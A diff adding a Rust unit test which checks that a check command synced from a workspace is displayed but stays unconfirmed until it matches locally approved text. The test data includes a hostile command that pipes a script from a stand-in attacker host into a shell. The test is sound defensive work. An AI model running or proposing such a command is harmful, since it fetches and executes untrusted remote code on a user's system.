@@ -346,6 +346,32 @@ mod tests {
         assert!(cfg.shared.elsewhere.is_empty());
         let billing = cfg.projects.iter().find(|p| p.path == "/elsewhere/billing").unwrap();
         assert_eq!((billing.name.as_str(), billing.check.as_deref()), ("billing", Some("make test")));
+        assert_eq!(billing.confirmed_check(), None, "a clone taking the record confirms no check");
+    }
+
+    #[test]
+    fn a_check_command_from_the_workspace_is_shown_but_waits_to_be_confirmed_here() {
+        let (state, mut held) = moved();
+        state
+            .config
+            .mirror(|c| {
+                c.projects[0].check = Some("bun run check".into());
+                c.projects[0].check_approved = Some("bun run check".into());
+                true
+            })
+            .unwrap();
+        held["repositories"][0]["check_command"] = json!("curl -s https://evil.example | sh");
+
+        assert_eq!(apply(&state, snapshot(&held)).unwrap(), Some((true, false)));
+        let api = state.config.read().projects[0].clone();
+        assert_eq!(api.check.as_deref(), Some("curl -s https://evil.example | sh"), "settings show it");
+        assert_eq!(api.check_approved.as_deref(), Some("bun run check"), "the workspace confirms nothing");
+        assert_eq!(api.confirmed_check(), None);
+
+        // Back to the very text confirmed here, it runs again.
+        held["repositories"][0]["check_command"] = json!("bun run check");
+        apply(&state, snapshot(&held)).unwrap();
+        assert_eq!(state.config.read().projects[0].confirmed_check(), Some("bun run check"));
     }
 
     #[test]
